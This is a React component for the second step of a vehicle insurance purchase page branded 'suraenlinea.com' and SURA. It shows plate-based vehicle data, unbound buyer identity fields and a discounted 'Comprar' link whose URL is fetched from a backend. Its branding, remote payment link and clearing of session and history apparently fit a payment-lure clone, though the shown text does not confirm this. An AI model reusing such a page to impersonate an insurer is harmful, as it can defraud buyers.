import { useEffect, useState } from "react";
import { useLoaderStore } from "../stores/useLoaderStore";
import { useGetBuyMessage } from "../hooks/useGetBuyMessage";
import { replace, useNavigate } from "react-router-dom";
import { useModalStore } from "../stores/useModalStore";
import { ExitMessage } from "../components/ExitMessage";

export const VistaDos = () => {
  const placa = sessionStorage.getItem("placa");
  const { setLoading } = useLoaderStore();
  const { messageBuy } = useGetBuyMessage(placa);
  const { setContent } = useModalStore();
  const [data, setData] = useState(messageBuy);
  const navigate = useNavigate();

  useEffect(() => {
    setLoading(false)
  }, []);

  setTimeout(() => {
    sessionStorage.clear();
  }, 3000)

  useEffect(() => {
    navigate('.', { replace: true });
  }, []);

  useEffect(() => {
    if (messageBuy) {
      setData(messageBuy);
    }
  }, [messageBuy]);

  const formatData = (data) => {
    return data.split('\n').map((line, index) => {
      const [key, value] = line.split(':');
      return (
        <p key={index}>
          <strong>{key}:</strong> {value}
        </p>
      );
    });
  };

  const getMinDate = () => {
    const today = new Date();
    const nextDay = new Date(today);
    nextDay.setDate(today.getDate() + 1);
    return nextDay.toISOString().split('T')[0];
  };

  const finalFuction = () => {
    navigate(messageBuy?.value);
    sessionStorage.removeItem("placa");
    setContent(<ExitMessage />);
  }

  return (
    <div className="grid grid-row bg-white relative">
      <div className="flex flex-col bg-white w-auto">
        <div className="flex">
          <div className="flex ml-10 md:col-span-2">
            <div className="text-[#0033A0] font-sans text-2xl  mt-1 lg:text-xl xl:text-xl ">
              suraenlinea.com |
            </div>
            <div className="bg-white ml-2 px-5 md:px-8 py-3.5 md:py-5  md:mt-0.5 bg-contain bg-no-repeat bg-center bg-[url('./assets/logo.svg')] w-20 mt-2 "></div>
          </div>
        </div>
      </div>
      <div className="flex flex-row justify-center items-end my-3 w-full gap-4">
        <div className="flex flex-wrap">
          <div className="rounded-full  w-6 h-6 bg-[#0033A0] ">
            <p className="text-center font-semibold font-sans p-0 m-0 text-white text-sm ">
              ✔️
            </p>
          </div>
          <p className="ml-2 mr-2 font-semibold font-sans"></p>
          <div className="rounded-full  bg-[#3BC1D4] w-6 h-6 ">
            <p className="text-center font-semibold font-sans p-0 m-0 text-white text-sm ">
              2
            </p>
          </div>
          <p className="mr-2 sm:mr-4 md:mr-2 font-semibold font-sans ">
          </p>
          <div className="flex flex-wrap md:flex-none">
            <div className="rounded-full bg-gray-300 w-6 h-6">
              <p className="text-center font-semibold font-sans p-0 m-0 text-[#3BC1D4] text-sm ">
                3
              </p>
            </div>
            <p className="ml-2 mr-2 font-semibold font-sans"></p>
          </div>
        </div>
      </div>
      <div className="md:grid md:grid-cols-2">
        <div className="grid grid-col bg-white md:col-span-1 md:ml-20 md:w-3/5">
          <div className="flex ml-10">
            <p className="text-[#0033A0] font-sans text-xl font-bold mt-8 mb-4 md:mb-2">
              {" "}
              Datos del vehículo
            </p>
          </div>
          <div className="flex flex-col ml-12 mr-12 mt-4 ">
            <div className="flex flex-col border-t-2 mb-4 ">
              <div className="flex flex-col p-3 text-balance border-2 mt-6 ">
                {messageBuy?.message ? formatData(messageBuy.message) : <>Cargando...</>}
              </div>
            </div>
          </div>
        </div>
        <h2 className="text-[#0033A0] text-xl font-bold text-start ml-10 mb-3">Datos del comprador</h2>
        <hr className="border-gray-200 border-2 w-[300px] m-auto" />
        <div className="flex flex-col justify-center items-center w-[300px] m-auto py-2">
          <label className="block text-gray-700 text-sm font-bold mb-2 self-start ml-10" htmlFor="fechaActual">
            Fecha Inicio de vigencia
          </label>
          <div className="mb-4 w-full flex flex-col justify-center items-center self-center text-start">
            <input
              id="fechaActual"
              type="date"
              min={getMinDate()}
              className="shadow appearance-none border rounded w-[285px] py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            />
          </div>
          <div>

            <div className="mb-4 relative w-[285px]">
              <label className="ml-1 font-semibold text-sm">
                Tipo de identificación
              </label>
              <select
                className="peer w-full bg-transparent placeholder:text-slate-400 text-slate-700 text-sm border border-slate-200 rounded-md px-3 py-2 h-10  transition duration-300 ease focus:outline-none focus:border-slate-400 hover:border-slate-300 shadow-sm focus:shadow"
              >
                <option value="Cédula de ciudadanía">Cédula de ciudadanía</option>
                <option value="Cédula de extranjería">Cédula de extranjería</option>
                <option value="Pasaporte">Pasaporte</option>
              </select>

            </div>
            <div className="mb-4 relative">
              <label className="ml-1 font-semibold text-sm">
                Número de identificación
              </label>
              <input
                className="peer w-full bg-transparent placeholder:text-slate-400 text-slate-700 text-sm border border-slate-200 rounded-md px-3 py-2 h-10  transition duration-300 ease focus:outline-none focus:border-slate-400 hover:border-slate-300 shadow-sm focus:shadow"
              />

            </div>
            <div className="mb-4 relative">
              <label className="ml-1 font-semibold text-sm">
                Nombre Completo
              </label>
              <input
                className="peer w-full bg-transparent placeholder:text-slate-400 text-slate-700 text-sm border border-slate-200 rounded-md px-3 py-2 h-10  transition duration-300 ease focus:outline-none focus:border-slate-400 hover:border-slate-300 shadow-sm focus:shadow"
              />

            </div>
            <div className="mb-4 relative">
              <label className="ml-1 font-semibold text-sm">
                Correo Electrónico
              </label>
              <input
                className="peer w-full bg-transparent placeholder:text-slate-400 text-slate-700 text-sm border border-slate-200 rounded-md px-3 py-2 h-10 transition duration-300 ease focus:outline-none focus:border-slate-400 hover:border-slate-300 shadow-sm focus:shadow mb-5"
                type="email"
              />
              <label className="ml-1 font-semibold text-sm">
                Teléfono
              </label>
              <input
                className="peer w-full bg-transparent placeholder:text-slate-400 text-slate-700 text-sm border border-slate-200 rounded-md px-3 py-2 h-10 transition duration-300 ease focus:outline-none focus:border-slate-400 hover:border-slate-300 shadow-sm focus:shadow"
                type="tel"
              />

            </div>
          </div>

        </div>
        <div className="md:col-span-1 md:m-5 md:mt-28 md:mr-14">
          <form onSubmit={(e) => e.preventDefault()}>
            <label className="flex items-center space-x-2">
              <input
                type="checkbox"
                className="text-blue-600 focus:ring-blue-500 focus:ring-2 h-4 w-4 rounded m-2 mb-4"
                required
              ></input>
              <span className="text-gray-700 underline mb-8">
                Autorizo el uso responsable de mi informacion y acepto los
                terminos y condiciones
              </span>
            </label>
            <a href={messageBuy?.value} className=" bg-[#3BC1D4] absolute w-screen text-white font-bold flex flex-col justify-center items-center rounded-lg h-16 transition duration-300 ease-in-out transform hover:bg-[#2DA3B4] hover:scale-105 active:scale-95"> Comprar por: {messageBuy?.title ? messageBuy.title : 0} <p className="text-sm text-white">Aplica 5% Descuento</p></a>
          </form>
        </div>
      </div>
      <div className="bg-[#53565A] mt-16">
        <p className="text-white m-3 font-sans">Medios de pago</p>
        <div className="flex justify-center mb-2">
          <div className="bg-contain bg-no-repeat bg-center bg-[url('./assets/logo5.png')] px-5 py-3"></div>
          <div className="bg-contain bg-no-repeat bg-center bg-[url('./assets/logo2.png')] px-5 py-3"></div>
          <div className="bg-contain bg-no-repeat bg-center bg-[url('./assets/logo3.png')] px-5 py-3"></div>
          <div className="bg-contain bg-no-repeat bg-center bg-[url('./assets/logo4.png')] px-5 py-3"></div>
          <div className="bg-contain bg-no-repeat bg-center bg-[url('./assets/logo1.svg')] px-5 py-3"></div>
        </div>
        <div className="px-10 py-3 bg-cover text-white text-sm text-center font-sans">
          <p> ℗2025 SURA. Todos los derechos reservados.</p>
          <p>politicas de uso y seguridad</p>
          <p>Politica de privacidad y ley de datos personales</p>
        </div>
      </div>
    </div>
  );
};
